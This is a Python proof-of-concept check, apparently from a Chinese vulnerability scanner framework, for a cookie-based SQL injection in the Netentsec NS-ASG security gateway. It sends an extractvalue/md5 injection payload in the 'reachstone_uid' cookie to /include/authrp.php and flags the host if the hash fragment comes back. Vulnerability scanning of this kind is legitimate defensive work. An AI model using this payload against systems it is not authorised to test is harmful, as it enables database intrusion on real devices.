# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    poc_id = 'cfe8277c-2bb7-4ddc-868a-64d27baca5de'
    name = '网康NS-ASG SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-04-30'  # 漏洞公布时间
    desc = '''
        网康 NS-ASG 应用安全网关 cookie注入漏洞：
        /include/authrp.php
        'reachstone_uid=1 and extractvalue(0x1,concat(0x23,md5(1)))'
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '网康应用安全网关'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e2ec1597-9097-42f2-a312-c8a07be141d2'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer: http://www.wooyun.org/bugs/wooyun-2014-058987
            hh = hackhttp.hackhttp()
            arg = self.target
            md5_1 = 'c4ca4238a'
            #cookie注入
            cookie = 'reachstone_uid=1 and extractvalue(0x1,concat(0x23,md5(1)))'
            url = arg + '/include/authrp.php'
            code, head, res, err, _ = hh.http(url, cookie=cookie)

            if (code==200) and (md5_1 in res):
                #security_hole('SQL Injection: {url} Cookie: {cookie}'.format(url=url,cookie=cookie))
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
